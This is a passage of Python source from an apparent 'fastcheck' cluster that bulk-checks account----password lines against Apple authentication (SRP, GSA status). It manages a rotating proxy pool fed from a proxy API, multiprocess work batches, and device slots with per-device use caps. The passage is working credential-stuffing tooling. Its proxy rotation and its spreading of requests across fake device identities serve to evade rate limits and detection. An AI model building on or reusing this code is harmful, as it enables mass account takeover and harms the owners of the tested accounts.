        # until their original expiry, without slowing worker acquisitions.
        fetched_at = time.monotonic() if fetched_at is None else float(fetched_at)
        expires_at = fetched_at + self.ttl
        now = time.monotonic()
        self._recent_exits = {key: expiry for key, expiry in self._recent_exits.items()
                              if expiry > now}
        if expires_at <= now:
            self._add(self.discarded, sum(bool(value) for value in values))
            return 0
        added = 0
        for value in values:
            if not value:
                continue
            try:
                key = self._exit_key(value)
            except ValueError:
                self._add(self.discarded, 1)
                continue
            if key in self._recent_exits:
                self._add(self.duplicates, 1)
                continue
            # The two physical queues share one logical capacity. Without this
            # guard, a full reusable queue plus scheduled fresh rotation could
            # silently grow a target=10,000 pool toward 20,000 entries.
            if self.snapshot()['known'] >= self.target:
                oldest = self._take(self.fresh, self.fresh_count, 0.02)
                if oldest is None:
                    oldest = self._take(self.reusable, self.reusable_count, 0.02)
                if oldest is None:  # every known exit is currently leased
                    continue
                self._add(self.discarded, 1)
                self._add(self.refreshed, 1)
            self._add(self.fresh_count, 1)
            try:
                self.fresh.put_nowait((str(value), expires_at, 0, 0))
            except queue.Full:
                self._add(self.fresh_count, -1)
                # Keep acquiring independent of the API: rotate one old queued
                # exit when full, never an exit already leased to a worker.
                oldest = self._take(self.fresh, self.fresh_count, 0.02)
                if oldest is not None:
                    self._add(self.discarded, 1)
                    self._add(self.refreshed, 1)
                self._add(self.fresh_count, 1)
                try:
                    self.fresh.put_nowait((str(value), expires_at, 0, 0))
                except queue.Full:
                    self._add(self.fresh_count, -1)
                    continue
            self._recent_exits[key] = expires_at
            added += 1
        self._add(self.fetched, added)
        # A rate-limited provider may return fewer exits than the requested
        # target (for example 200 per minute for 1,000 workers).  Start work as
        # soon as any usable stock exists; remaining workers now backpressure
        # on the shared pool and reuse leases as they are returned.
        if added:
            self.ready.set()
        return added

    def _take(self, channel, counter, timeout=0.0):
        while True:
            try:
                item = channel.get(timeout=timeout) if timeout else channel.get_nowait()
            except queue.Empty:
                return None
            self._add(counter, -1)
            timeout = 0.0
            if float(item[1]) > time.monotonic():
                return item
            self._add(self.discarded, 1)

    def acquire(self, wait=1.0):
        # Never wait for a new API response while a healthy queued exit exists.
        lease = self._take(self.fresh, self.fresh_count)
        # multiprocessing.Queue publishes through a feeder thread.  Its shared
        # count can therefore become visible a few milliseconds before get()
        # can see the item.  Preserve fresh-first ordering instead of falling
        # through to an already reusable exit during that short window.
        if lease is None and self._value(self.fresh_count) > 0:
            lease = self._take(self.fresh, self.fresh_count,
                               min(0.02, max(0.0, float(wait))))
        if lease is not None:
            if self._value(self.fresh_count) < self.low_water:
                self.refill.set()
            self._add(self.in_use_count, 1)
            return lease
        self.refill.set()
        lease = self._take(self.reusable, self.reusable_count)
        if lease is not None:
            self._add(self.reused, 1)
            self._add(self.in_use_count, 1)
            return (lease[0], lease[1], int(lease[2]) + 1,
                    int(lease[3]) if len(lease) > 3 else 0)
        # Queue feeder visibility can lag its published count. Only when both
        # queues are empty do we allow the caller's bounded resource wait.
        self._add(self.waits, 1)
        deadline = time.monotonic() + max(0.0, float(wait))
        while time.monotonic() < deadline:
            lease = self._take(self.fresh, self.fresh_count,
                               min(0.01, max(0.0, deadline - time.monotonic())))
            if lease is not None:
                self._add(self.in_use_count, 1)
                return lease
            lease = self._take(self.reusable, self.reusable_count)
            if lease is not None:
                self._add(self.reused, 1)
                self._add(self.in_use_count, 1)
                return (lease[0], lease[1], int(lease[2]) + 1,
                        int(lease[3]) if len(lease) > 3 else 0)
        return None

    def release(self, lease, healthy):
        if lease is None:
            return
        self._add(self.in_use_count, -1)
        if float(lease[1]) <= time.monotonic():
            self._add(self.discarded, 1)
            return
        failures = int(lease[3]) if len(lease) > 3 else 0
        if not healthy:
            failures += 1
            self._add(self.soft_failures, 1)
            if failures >= PROXY_FAILURE_LIMIT:
                self._add(self.discarded, 1)
                self.refill.set()
                return
        else:
            failures = 0
        reusable = (lease[0], lease[1], int(lease[2]), failures)
        self._add(self.reusable_count, 1)
        try:
            self.reusable.put_nowait(reusable)
        except queue.Full:
            self._add(self.reusable_count, -1)
            self._add(self.discarded, 1)
            return

    def discard(self, lease):
        """Remove a leased exit immediately and request a replacement.

        The supplier's recent-exit history still remembers the endpoint until
        its original TTL, so an HTTP 0/503 exit cannot be fetched straight back
        into the pool during the five-second retry delay.
        """
        if lease is None:
            return
        self._add(self.in_use_count, -1)
        self._add(self.discarded, 1)
        self.refill.set()

    def prune_expired(self):
        """Remove idle expired leases, even when no worker acquires an exit."""
        removed = 0
        for channel, counter in ((self.fresh, self.fresh_count),
                                 (self.reusable, self.reusable_count)):
            for _ in range(self._value(counter)):
                try:
                    lease = channel.get(timeout=0.02)
                except queue.Empty:
                    break
                self._add(counter, -1)
                if float(lease[1]) <= time.monotonic():
                    self._add(self.discarded, 1)
                    removed += 1
                    continue
                self._add(counter, 1)
                try:
                    channel.put_nowait(lease)
                except queue.Full:
                    self._add(counter, -1)
                    self._add(self.discarded, 1)
                    removed += 1
        return removed

    def count_aging(self, now=None):
        """Count queued exits with at most 45 seconds of lifetime remaining."""
        current = time.monotonic() if now is None else float(now)
        aging = 0
        remaining = PROXY_AGING_SECONDS
        for channel, counter in ((self.fresh, self.fresh_count),
                                 (self.reusable, self.reusable_count)):
            visible = []
            for _ in range(self._value(counter)):
                try:
                    # multiprocessing.Queue publishes its shared count before
                    # the feeder has necessarily made the item readable.  A
                    # short bounded wait keeps the pre-expiry rotation scan
                    # deterministic without entering the worker hot path.
                    lease = channel.get(timeout=0.02)
                except queue.Empty:
                    break
                self._add(counter, -1)
                visible.append(lease)
                if float(lease[1]) - current <= remaining:
                    aging += 1
            for lease in visible:
                self._add(counter, 1)
                try:
                    channel.put_nowait(lease)
                except queue.Full:
                    self._add(counter, -1)
                    self._add(self.discarded, 1)
        with self.aging_inventory.get_lock():
            self.aging_inventory.value = aging
        return aging

    def note_fetch(self, milliseconds, error=False):
        self._add(self.fetch_calls, 1)
        if error:
            self._add(self.fetch_errors, 1)
        with self.last_fetch_ms.get_lock():
            self.last_fetch_ms.value = max(0.0, float(milliseconds))

    def snapshot(self):
        with self.last_fetch_ms.get_lock():
            last_fetch_ms = self.last_fetch_ms.value
        available = self._value(self.fresh_count) + self._value(self.reusable_count)
        in_use = self._value(self.in_use_count)
        with self.aging_inventory.get_lock():
            aging = self.aging_inventory.value
        return {
            'available': available,
            'in_use': in_use,
            'known': available + in_use,
            'fresh': self._value(self.fresh_count),
            'reusable': self._value(self.reusable_count),
            'target': self.target,
            'low_water': self.low_water,
            'fetched': self._value(self.fetched),
            'fetch_calls': self._value(self.fetch_calls),
            'fetch_errors': self._value(self.fetch_errors),
            'reused': self._value(self.reused),
            'discarded': self._value(self.discarded),
            'soft_failures': self._value(self.soft_failures),
            'failure_limit': PROXY_FAILURE_LIMIT,
            'waits': self._value(self.waits),
            'duplicates': self._value(self.duplicates),
            'refreshed': self._value(self.refreshed),
            'last_fetch_ms': round(last_fetch_ms, 1),
            'ttl_seconds': self.ttl,
            'ready': self.ready.is_set(),
            'expiring_45s': aging,
            # Compatibility alias for older controller/node panels.
            'aging_45s': aging,
        }

    def close(self):
        for channel in (self.fresh, self.reusable):
            try:
                # 队列可能在节点结束时仍有库存；等待 feeder 把无人读取的
                # 整池数据写完可能卡住协调进程，关闭时直接丢弃剩余库存。
                channel.cancel_join_thread()
                channel.close()
            except (OSError, ValueError):
                pass


def proxy_supplier_loop(pool, api_url, scheme, stop, fetcher=None, debug_path=None):
    """Fill shortages and prefetch replacements once exits are 45s old."""
    if fetcher is None:
        from fastcheck.proxy_pool import fetch_proxies
        fetcher = fetch_proxies
    maintenance_stop = threading.Event()

    def maintain():
        # Expiry cleanup must not stall behind a slow external API call.
        while not stop.is_set() and not maintenance_stop.is_set():
            pool.prune_expired()
            maintenance_stop.wait(1.0)

    maintenance = threading.Thread(target=maintain, name='proxy-pool-expiry', daemon=True)
    maintenance.start()
    next_tick = time.monotonic()
    try:
        while not stop.is_set():
            if stop.wait(max(0.0, next_tick - time.monotonic())):
                return
            pool.refill.clear()
            # Busy leases count as inventory and will return to the reusable
            # queue. Refill to the target only after total known inventory
            # drops below the low-water mark; do not continuously chase every
            # small gap between low-water and target.
            state = pool.snapshot()
            known = int(state.get('known') or 0)
            needed = max(0, pool.target - known) if known < pool.low_water else 0
            # Independently replace only exits whose real expiry is at most
            # 45 seconds away. A 1,800-second lease is therefore not rotated
            # merely because it has been in the pool for 45 seconds.
            aging = pool.count_aging()
            count = min(PROXY_FETCH_LIMIT, max(needed, aging))
            if count <= 0:
                next_tick += 1.0
                continue
            started = time.monotonic()
            before = _proxy_pool_snapshot(pool) if debug_path else {}
            try:
                values = list(fetcher(api_url, count,
                                      scheme=None if scheme == 'http' else scheme))
                if stop.is_set():
                    return
                # A proxy gets its full TTL when it actually enters the node
                # pool; slow supplier responses must not consume lease life.
                added = pool.add_fresh(values)
                milliseconds = (time.monotonic() - started) * 1000
                pool.note_fetch(milliseconds)
                if debug_path:
                    _write_proxy_debug(
                        debug_path, 'supplier_fetch', requested=count,
                        returned=len(values), added=added,
                        latency_ms=round(milliseconds, 2), pool_before=before,
                        pool_after=_proxy_pool_snapshot(pool))
            except Exception as exc:                               # noqa: BLE001
                milliseconds = (time.monotonic() - started) * 1000
                pool.note_fetch(milliseconds, error=True)
                if debug_path:
                    _write_proxy_debug(
                        debug_path, 'supplier_error', requested=count,
                        latency_ms=round(milliseconds, 2),
                        error_type=type(exc).__name__, detail=_proxy_debug_detail(exc),
                        pool_before=before, pool_after=_proxy_pool_snapshot(pool))
            next_tick += 1.0
            now = time.monotonic()
            if next_tick < now:
                # One in-flight request only; skip missed ticks, never pile up.
                next_tick = now
    finally:
        maintenance_stop.set()
        maintenance.join(1.5)


def execute_unit(directory, descriptor, stop):
    directory = Path(directory)
    started = time.time()
    processed = 0
    output_path = directory / 'results.jsonl'
    output_digest = hashlib.sha256()

    def transform(item):
        row, line = item
        raw = line.rstrip(b'\r\n')
        if descriptor['mode'] == 'simulate':
            # The override is used by the local soak verifier to keep a large
            # test running long enough to observe dispatch and 1 Hz reports.
            delay = float(os.environ.get('CLUSTER_LAB_SIMULATE_DELAY', '0.004'))
            time.sleep(max(0.0, min(delay, 10.0)))
        # account 保留原始记录，供总控逐行核对；status 是分类结果。
        # 离线摘要没有业务判定，统一记为 valid，接入真实执行器后由执行器给值。
        record = {'row': row, 'account': raw.decode('utf-8', 'replace')[:512],
                  'status': 'valid', 'sha256': hashlib.sha256(raw).hexdigest(), 'bytes': len(raw)}
        return (json.dumps(record, separators=(',', ':')) + '\n').encode()

    try:
        with (directory / 'input.part').open('rb') as source, output_path.open('wb') as output:
            output_path.chmod(0o600)
            with ThreadPoolExecutor(max_workers=descriptor['threads']) as pool:
                # Reclaim whichever request finishes first so a slow account
                # cannot stop the executor from dispatching more work.  Keep
                # a small ordered result buffer so the package JSONL contract
                # (row order) remains unchanged.
                pending = {}
                completed = {}
                next_row = descriptor['first_row']
                next_write_row = descriptor['first_row']
                exhausted = False
                last_progress = 0
                while not exhausted or pending or completed:
                    if stop.is_set():
                        raise InterruptedError('租约失效或节点关闭')
                    while not exhausted and len(pending) < descriptor['threads'] * 2:
                        line = source.readline(65537)
                        if not line:
                            exhausted = True
                            break
                        if len(line) > 65536:
                            raise ValueError('输入记录过长')
                        future = pool.submit(transform, (next_row, line))
                        pending[future] = next_row
                        next_row += 1
                    if pending:
                        finished, _unfinished = wait(
                            set(pending), timeout=0.25,
                            return_when=FIRST_COMPLETED)
                        for future in finished:
                            row = pending.pop(future)
                            completed[row] = future.result()
                    while next_write_row in completed:
                        result = completed.pop(next_write_row)
                        output.write(result)
                        output_digest.update(result)
                        processed += 1
                        next_write_row += 1
                    if time.monotonic() - last_progress > 0.25:
                        # Make complete JSONL lines visible to the node agent.
                        # Only the node heartbeat reports them; worker processes
                        # never contact the controller directly.
                        output.flush()
                        atomic_json(directory / 'progress.json',
                                    {'processed': processed, 'started': started,
                                     'counts': {'valid': processed}})
                        last_progress = time.monotonic()
            output.flush()
        if processed != descriptor['rows']:
            raise ValueError('输入条数和工作包描述不一致')
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started,
                     'counts': {'valid': processed}})
        atomic_json(directory / 'done.json', {'ok': True, 'processed': processed,
                    'counts': {'valid': processed},
                    'checksum': output_digest.hexdigest(), 'elapsed': time.time() - started})
    except Exception as exc:
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started,
                     'counts': {'valid': processed}})
        atomic_json(directory / 'done.json', {'ok': False, 'processed': processed, 'error': type(exc).__name__})


def _group_child(directory, descriptor, stop, proxy_pool=None):
    # 认证子进程属于吞吐型后台工作。降低它相对节点主进程的调度优先级，
    # 避免 SRP/PBKDF2/TLS 高负载时心跳线程拿不到 CPU 而误丢租约。
    worker_nice = 0
    if mp.parent_process() is not None:
        try:
            worker_nice = os.nice(5)
        except (AttributeError, OSError):
            worker_nice = 0
    descriptor['_worker_nice'] = worker_nice
    if proxy_pool is not None:
        # Proxy stock is expendable; result files are independently flushed.
        # A child must not wait at exit for its reusable-queue feeder to drain
        # into a pipe nobody reads while the coordinator waits for this child.
        for channel in (proxy_pool.fresh, proxy_pool.reusable):
            channel.cancel_join_thread()
    runner = execute_auth_unit if descriptor.get('mode') == 'auth' else execute_unit
    if runner is execute_auth_unit:
        runner(directory, descriptor, stop, proxy_pool=proxy_pool)
    else:
        runner(directory, descriptor, stop)


def _auth_worker_limit(configured, configured_processes=1, active_processes=None):
    """Preserve total network concurrency across CPU-sized auth processes."""
    configured = max(1, int(configured or 1))
    configured_processes = max(1, int(configured_processes or 1))
    active_processes = max(1, int(active_processes or configured_processes))
    total_concurrency = configured_processes * configured
    return (total_concurrency + active_processes - 1) // active_processes


def _auth_process_limit(configured, rows, cpu_count=None):
    """Use one GMP compute lane per logical CPU."""
    configured = max(1, int(configured or 1))
    rows = max(1, int(rows or 1))
    logical_cpus = max(1, int(cpu_count or os.cpu_count() or 1))
    return min(configured, rows, logical_cpus)


def execute_unit_group(directory, descriptor, stop):
    """Use one controller package as a complete node-sized work batch.

    The controller leases at most one package to a node.  This coordinator
    splits that package locally into contiguous ranges, starts the configured
    process count, aggregates their progress, and merges ordered results.  The
    controller therefore keeps only 10,000-row package metadata while a node
    still uses all of its process and thread capacity.
    """
    directory = Path(directory)
    descriptor = dict(descriptor)
    debug_path = None
    if _proxy_debug_enabled(descriptor):
        debug_path = directory / 'proxy-debug.jsonl'
        descriptor['_proxy_debug'] = True
        descriptor['_proxy_debug_path'] = str(debug_path)
        _write_proxy_debug(
            debug_path, 'debug_start', job_id=str(descriptor.get('job_id') or ''),
            unit_id=str(descriptor.get('id') or ''), rows=int(descriptor.get('rows') or 0),
            processes=int(descriptor.get('processes') or 1),
            threads=int(descriptor.get('threads') or 1),
            retries=int(descriptor.get('retries') or 0),
            timeout=float(descriptor.get('timeout') or 20),
            mode='sampled_performance_plus_timeouts',
            sample_every=PERFORMANCE_TRACE_SAMPLE_EVERY,
            credentials_recorded=False)
    started = time.time()
    rows = max(0, int(descriptor.get('rows') or 0))
    process_limit = max(1, int(descriptor.get('processes') or 1))
    node_cpu_count = max(1, int(os.cpu_count() or 1))
    process_count = min(process_limit, max(1, rows))
    if descriptor.get('mode') == 'auth':
        process_count = _auth_process_limit(process_limit, rows, node_cpu_count)
    descriptor['_node_process_count'] = process_count
    descriptor['_node_configured_process_count'] = process_limit
    descriptor['_node_cpu_count'] = node_cpu_count
    configured_threads = max(1, int(descriptor.get('threads') or 1))
    process_slots = []
    if descriptor.get('mode') == 'auth':
        assigned_slots = descriptor.get('device_slots') or []
        process_count = min(process_count, max(1, len(assigned_slots)))
        process_slots = [_partition_device_slots(assigned_slots, process_count, index)
                         for index in range(process_count)]
        active_threads_by_process = [
            _effective_auth_workers(configured_threads, slots,
                                    descriptor.get('process_request_budget'))
            for slots in process_slots]
        active_threads_per_process = max(active_threads_by_process)
    else:
        active_threads_by_process = [configured_threads] * process_count
        active_threads_per_process = configured_threads
    descriptor['_node_process_count'] = process_count
    descriptor['configured_threads'] = configured_threads
    descriptor['_active_threads_per_process'] = active_threads_per_process
    descriptor['_active_threads_by_process'] = active_threads_by_process
    if descriptor.get('mode') == 'auth' and process_count == 1:
        descriptor['threads'] = active_threads_by_process[0]
    context = mp.get_context('spawn')
    proxy_pool = None
    supplier_stop = None
    supplier_thread = None
    if descriptor.get('mode') == 'auth' and descriptor.get('proxy_api'):
        concurrency = sum(active_threads_by_process)
        configured_target = max(1, int(descriptor.get('proxy_pool_size') or concurrency))
        proxy_pool = NodeProxyPool(
            context, concurrency,
            ttl=float(descriptor.get('proxy_ttl') or PROXY_TTL_SECONDS),
            target=min(PROXY_POOL_LIMIT, max(1, min(rows, configured_target))))
        supplier_stop = threading.Event()
        supplier_thread = threading.Thread(
            target=proxy_supplier_loop,
            args=(proxy_pool, descriptor['proxy_api'],
                  descriptor.get('proxy_scheme') or 'socks5h', supplier_stop,
                  None, debug_path),
            name='node-proxy-supplier', daemon=True)
        supplier_thread.start()
        # Start workers only after the node has begun filling its own pool.
        # Bound the wait so a broken supplier cannot block task cancellation.
        prefill_started = time.monotonic()
        prefill_deadline = prefill_started + min(30.0, proxy_pool.ttl)
        while (not stop.is_set() and not proxy_pool.ready.is_set() and
               time.monotonic() < prefill_deadline):
            proxy_pool.ready.wait(0.1)
        if debug_path:
            _write_proxy_debug(
                debug_path, 'pool_prefill', ready=proxy_pool.ready.is_set(),
                wait_ms=round((time.monotonic() - prefill_started) * 1000, 2),
                pool=_proxy_pool_snapshot(proxy_pool))
    if process_count == 1:
        try:
            _group_child(directory, descriptor, stop, proxy_pool)
        finally:
            if supplier_stop is not None:
                supplier_stop.set()
                proxy_pool.refill.set()
                supplier_thread.join(2)
        progress = read_progress = {}
        try:
            read_progress = json.loads((directory / 'progress.json').read_text('utf-8'))
        except (OSError, ValueError):
            pass
        read_progress.update(workers=0, worker_limit=process_limit,
                             active_process_limit=process_count,
                             threads_per_process=configured_threads,
                             active_threads_per_process=active_threads_per_process,
                             active_threads_by_process=active_threads_by_process,
                             active_threads_total=sum(active_threads_by_process))
        if proxy_pool is not None:
            read_progress['proxy_pool'] = proxy_pool.snapshot()
        atomic_json(directory / 'progress.json', read_progress)
        try:
            done = json.loads((directory / 'done.json').read_text('utf-8'))
            if proxy_pool is not None:
                done['proxy_pool'] = proxy_pool.snapshot()
            atomic_json(directory / 'done.json', done)
        finally:
            if proxy_pool is not None and debug_path:
                _write_proxy_debug(debug_path, 'debug_stop', ok=True,
                                   pool=_proxy_pool_snapshot(proxy_pool))
            if proxy_pool is not None:
                proxy_pool.close()
        return

    workers_root = directory / 'workers'
    workers_root.mkdir(mode=0o700, parents=True, exist_ok=True)
    counts = [rows // process_count + (index < rows % process_count)
              for index in range(process_count)]
    child_descriptors = []
    current_row = int(descriptor.get('first_row') or 1)
    with (directory / 'input.part').open('rb') as source:
        for index, count in enumerate(counts):
            child_dir = workers_root / f'{index + 1:03d}'
            child_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
            for name in ('done.json', 'progress.json', 'results.jsonl'):
                (child_dir / name).unlink(missing_ok=True)
            child_input = child_dir / 'input.part'
            with child_input.open('wb') as output:
                child_input.chmod(0o600)
                for _ in range(count):
                    line = source.readline(65537)
                    if not line:
                        raise ValueError('input ended before local fan-out completed')
                    if len(line) > 65536:
                        raise ValueError('input record too long')
                    output.write(line)
            child = dict(descriptor, first_row=current_row, rows=count, processes=1)
            if descriptor.get('mode') == 'auth':
                # 每个进程分到一组不重叠槽位；30 台 / 10 进程时每进程 3 台，
                # 避免整个子包的账号都累计到同一台设备。
                assigned = descriptor.get('device_slots') or []
                child['device_slots'] = process_slots[index]
                child['configured_threads'] = configured_threads
                child['threads'] = active_threads_by_process[index]
                child['_active_threads_per_process'] = child['threads']
                child['device_pool_capacity'] = int(
                    descriptor.get('device_pool_capacity') or max(assigned))
            atomic_json(child_dir / 'manifest.json', child)
            child_descriptors.append((child_dir, child))
            current_row += count
        if source.read(1):
            raise ValueError('input contains more rows than package descriptor')

    children = []
    try:
        for index, (child_dir, child) in enumerate(child_descriptors):
            child_stop = context.Event()
            process = context.Process(target=_group_child,
                                      args=(str(child_dir), child, child_stop, proxy_pool),
                                      name=f'package-worker-{index + 1:02d}')
            process.start()
            children.append((process, child_stop, child_dir))

        last_write = 0.0
        last_processed = -1
        last_progress_at = time.monotonic()
        stall_timeout = stall_timeout_seconds(descriptor)
        while any(process.is_alive() for process, _, _ in children):
            if stop.is_set():
                for _, child_stop, _ in children:
                    child_stop.set()
            processed = 0
            active = 0
            live_counts = {}
            for process, _, child_dir in children:
                active += int(process.is_alive())
                try:
                    child_progress = json.loads((child_dir / 'progress.json').read_text('utf-8'))
                    processed += int(child_progress.get('processed') or 0)
                    for key, value in (child_progress.get('counts') or {}).items():
                        live_counts[key] = live_counts.get(key, 0) + int(value)
                except (OSError, ValueError):
                    pass
            now = time.monotonic()
            if processed != last_processed:
                last_processed = processed
                last_progress_at = now
            elif not stop.is_set() and now - last_progress_at >= stall_timeout:
                raise RuntimeError(
                    f'工作包无进度超过 {int(stall_timeout)} 秒，已中止并交回总控')
            if now - last_write >= 0.25:
                atomic_json(directory / 'progress.json',
                            {'processed': processed, 'started': started,
                             'workers': active, 'worker_limit': process_count,
                             'configured_process_limit': process_limit,
                             'threads_per_process': configured_threads,
                             'active_threads_per_process': active_threads_per_process,
                             'active_threads_by_process': active_threads_by_process,
                             'active_threads_total': sum(active_threads_by_process),
                             'counts': live_counts,
                             **({'proxy_pool': proxy_pool.snapshot()} if proxy_pool else {})})
                last_write = now
            time.sleep(0.05)

        failures = []
        for process, _, child_dir in children:
            process.join()
            done = {}
            try:
                done = json.loads((child_dir / 'done.json').read_text('utf-8'))
            except (OSError, ValueError):
                pass
            if process.exitcode != 0 or not done.get('ok'):
                failures.append(str(done.get('error') or f'worker_exit_{process.exitcode}'))
        if failures:
            raise RuntimeError(failures[0])

        output_digest = hashlib.sha256()
        processed = 0
        merged_counts = {}
        merged_output = directory / 'results.jsonl'
        with merged_output.open('wb') as output:
            merged_output.chmod(0o600)
            for _, _, child_dir in children:
                done = json.loads((child_dir / 'done.json').read_text('utf-8'))
                processed += int(done['processed'])
                for key, value in (done.get('counts') or {}).items():
                    merged_counts[key] = merged_counts.get(key, 0) + int(value)
                with (child_dir / 'results.jsonl').open('rb') as source:
                    for block in iter(lambda: source.read(1024 * 1024), b''):
                        output.write(block)
                        output_digest.update(block)
            output.flush()
            os.fsync(output.fileno())
        if processed != rows:
            raise ValueError('local fan-out result count mismatch')
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started, 'workers': 0,
                     'worker_limit': process_count,
                     'configured_process_limit': process_limit,
                     'threads_per_process': configured_threads,
                     'active_threads_per_process': active_threads_per_process,
                     'active_threads_by_process': active_threads_by_process,
                     'active_threads_total': sum(active_threads_by_process),
                     'counts': merged_counts,
                     **({'proxy_pool': proxy_pool.snapshot()} if proxy_pool else {})})
        atomic_json(directory / 'done.json',
                    {'ok': True, 'processed': processed, 'counts': merged_counts,
                     'checksum': output_digest.hexdigest(),
                     'workers': process_count, 'elapsed': time.time() - started,
                     'configured_process_limit': process_limit,
                     'active_threads_per_process': active_threads_per_process,
                     'active_threads_by_process': active_threads_by_process,
                     'active_threads_total': sum(active_threads_by_process),
                     **({'proxy_pool': proxy_pool.snapshot()} if proxy_pool else {})})
    except Exception as exc:                                      # noqa: BLE001
        for process, child_stop, _ in children:
            child_stop.set()
            process.join(2)
            if process.is_alive():
                process.terminate()
                process.join(2)
        processed = 0
        live_counts = {}
        for _, _, child_dir in children:
            try:
                child_progress = json.loads((child_dir / 'progress.json').read_text('utf-8'))
                processed += int(child_progress.get('processed') or 0)
                for key, value in (child_progress.get('counts') or {}).items():
                    live_counts[key] = live_counts.get(key, 0) + int(value)
            except (OSError, ValueError):
                pass
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started, 'workers': 0,
                     'worker_limit': process_count,
                     'configured_process_limit': process_limit,
                     'threads_per_process': configured_threads,
                     'active_threads_per_process': active_threads_per_process,
                     'active_threads_by_process': active_threads_by_process,
                     'active_threads_total': sum(active_threads_by_process),
                     'counts': live_counts,
                     **({'proxy_pool': proxy_pool.snapshot()} if proxy_pool else {})})
        atomic_json(directory / 'done.json',
                    {'ok': False, 'processed': processed,
                     'error': f'{type(exc).__name__}: {exc}'[:300],
                     **({'proxy_pool': proxy_pool.snapshot()} if proxy_pool else {})})
    finally:
        if supplier_stop is not None:
            supplier_stop.set()
            proxy_pool.refill.set()
            supplier_thread.join(2)
        for process, _, _ in children:
            process.close()
        if proxy_pool is not None and debug_path:
            _write_proxy_debug(debug_path, 'debug_stop',
                               ok=bool((directory / 'done.json').exists()),
                               pool=_proxy_pool_snapshot(proxy_pool))
        if proxy_pool is not None:
            proxy_pool.close()


def _load_fastcheck():
    """cluster-lab 与 fastcheck 在同一仓库的兄弟目录，运行时按需挂载。"""
    import sys
    from pathlib import Path
    # cluster-lab 目录下的 fastcheck 软链接优先：父目录通常只有 x 权限，
    # Python 的 FileFinder 要用 os.listdir 才能发现包，会 ImportError。
    here = Path(__file__).resolve().parents[1]
    candidates = [here, Path(__file__).resolve().parents[2]]
    root = next((path for path in candidates if (path / 'fastcheck').exists()), candidates[-1])
    if str(root) not in sys.path:
        sys.path.insert(0, str(root))
    try:
        from fastcheck.devices import DevicePool
    except ModuleNotFoundError as exc:
        if (root / 'fastcheck').exists():
            raise RuntimeError(
                f'无法导入 fastcheck（{root / "fastcheck"} 存在但不可读或缺少依赖）：{exc}') from exc
        raise RuntimeError(f'找不到 fastcheck 目录：{root / "fastcheck"}') from exc
    from fastcheck.protocols.gsa_status import check as gsa_check
    from fastcheck.status import result_bucket
    return DevicePool, gsa_check, result_bucket


def _split_account(line):
    """输入行形如 账号----密码；没有分隔符时整行当账号、密码留空。"""
    for separator in ('----', '\t', ':'):
        if separator in line:
            account, _, password = line.partition(separator)
            return account.strip(), password.strip()
    return line.strip(), ''


def _input_problem(account, password):
    """返回输入行的格式问题；None 表示可以提交认证。

    三横线的 `邮箱---密码` 会被 _split_account 读成"整行账号 + 空密码"，
    提交后 Apple 在 init 阶段回 -20970（Your account information was
    entered incorrectly），面板显示"已失效"，看起来像账号失效，实际一行
    请求都没到 SRP 阶段。这里提前拦下，不消耗设备与出口。
    只拦"整行账号里还留着分隔符"这一种特征，其它输入照原样提交。
    """
    if '---' in account and not password:
        return 'three dashes instead of four: the whole line was read as account'
    if any(ord(character) < 32 for character in account + password):
        return 'control character in account line'
    if len(account) > 4096 or len(password) > 4096:
        return 'field too long'
    return None


def _bump_usage(device_root, counts):
    """每个工作包合并写一次设备计数，并用进程锁防止覆盖。"""
    if not device_root or not counts:
        return
    import portalocker
    path = Path(device_root) / 'usage.json'
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    lock = path.with_suffix('.lock')
    try:
        with portalocker.Lock(str(lock), mode='a+', timeout=10):
            try:
                data = json.loads(path.read_text('utf-8')) if path.exists() else {}
            except (OSError, ValueError):
                data = {}
            for slot, count in counts.items():
                key = str(int(slot))
                data[key] = int(data.get(key) or 0) + int(count)
            atomic_json(path, data)
    except (OSError, portalocker.exceptions.LockException):
        pass


def _merge_device_usage(device_root, values):
    """Persist absolute counters for disjoint process-owned device slots."""
    if not device_root or not values:
        return
    import portalocker
    path = Path(device_root) / 'usage.json'
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    lock = path.with_suffix('.lock')
    with portalocker.Lock(str(lock), mode='a+', timeout=10):
        try:
            data = json.loads(path.read_text('utf-8')) if path.exists() else {}
        except (OSError, ValueError):
            data = {}
        for slot, value in values.items():
            data[str(int(slot))] = max(0, int(value))
        atomic_json(path, data)


def _set_device_usage(device_root, slot, value):
    """Set one slot's durable use counter under the shared usage lock."""
    if not device_root:
        return int(value)
    import portalocker
    path = Path(device_root) / 'usage.json'
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    lock = path.with_suffix('.lock')
    with portalocker.Lock(str(lock), mode='a+', timeout=10):
        try:
            data = json.loads(path.read_text('utf-8')) if path.exists() else {}
        except (OSError, ValueError):
            data = {}
        data[str(int(slot))] = max(0, int(value))
        atomic_json(path, data)
    return max(0, int(value))


def _consume_device_use(device_root, slot, use_limit=DEVICE_USE_LIMIT):
    """Increment a device exactly once before a request, never beyond limit."""
    if not device_root:
        raise ValueError('device_root is required for bounded device use')
    import portalocker
    path = Path(device_root) / 'usage.json'
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    lock = path.with_suffix('.lock')
    with portalocker.Lock(str(lock), mode='a+', timeout=10):
        try:
            data = json.loads(path.read_text('utf-8')) if path.exists() else {}
        except (OSError, ValueError):
            data = {}
        key = str(int(slot))
        current = max(0, int(data.get(key) or 0))
        limit = max(1, int(use_limit or DEVICE_USE_LIMIT))
        if current >= limit:
            raise RuntimeError(f'device slot {slot} reached use limit {limit}')
        current += 1
        data[key] = current
        atomic_json(path, data)
        return current


def _usage_snapshot(device_root):
    """Read the durable per-slot count used before this worker package starts."""
    if not device_root:
        return {}
    path = Path(device_root) / 'usage.json'
    try:
        data = json.loads(path.read_text('utf-8')) if path.exists() else {}
    except (OSError, TypeError, ValueError):
        return {}
    result = {}
    for slot, count in data.items():
        try:
            result[int(slot)] = max(0, int(count or 0))
        except (TypeError, ValueError):
            continue
    return result


def record_device_registration(device_root, slot, proxy, model=''):
    """Persist registration facts for the slot's current identity generation.

    The caller owns the slot's exclusive device lease. Re-registration means
    the old identity was retired, so its timestamp and proxy must be replaced
    rather than displayed beside the new identity.
    """
    if not device_root:
        return False
